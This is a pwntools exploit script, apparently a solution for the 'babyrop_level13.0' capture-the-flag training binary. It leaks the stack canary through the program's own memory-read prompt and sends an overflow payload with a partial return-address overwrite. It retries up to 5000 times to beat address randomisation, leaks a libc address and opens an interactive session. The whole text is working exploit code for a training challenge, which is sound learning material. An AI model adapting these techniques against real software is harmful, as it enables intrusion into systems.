from pwn import *
import time 

binary = './babyrop_level13.0'
elf = ELF(binary)

context.binary = binary




for i in range(5000):

	try:
		p = process(binary)
		offset = 0x50
		p.recvuntil(b"Your input buffer is located at: ")
		buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
		print(f"[+] Input buffer is at: {hex(buffer_addr)}")
		win_ptr_addr = buffer_addr - 8

		canary_addr = buffer_addr + offset - 0x8
		p.sendlineafter(b"Address in hex to read from:\n", hex(canary_addr).encode())
		p.recvuntil(b" = ")
		canary = int(p.recvuntil(b"\n", drop=True), 16)
		print(f"[+] Canary value: {hex(canary)}")

		start_addr_ptr = buffer_addr + 0x120
		
		

		payload = flat(
			b'A'* 0x48,
			canary,
			start_addr_ptr,
			b'\xc8\x78\x05'
		)

		p.send(payload)

		libc_addr_ptr = buffer_addr + 0x50 + 8
		p.sendlineafter(b"Address in hex to read from:\n", hex(libc_addr_ptr).encode())
		p.recvuntil(b" = ")
		libc_addr = int(p.recvuntil(b"\n", drop=True), 16)
		print(f"[+] Libc address leak: {hex(libc_addr)}")
		
		output = p.recvall(timeout=0.3)
		#print(output)
		if b"Libc address leak" in output:
		    break
		
		p.close()
	except Exception:
		try:
		    p.close()
		except:
		    pass
	





p.interactive()
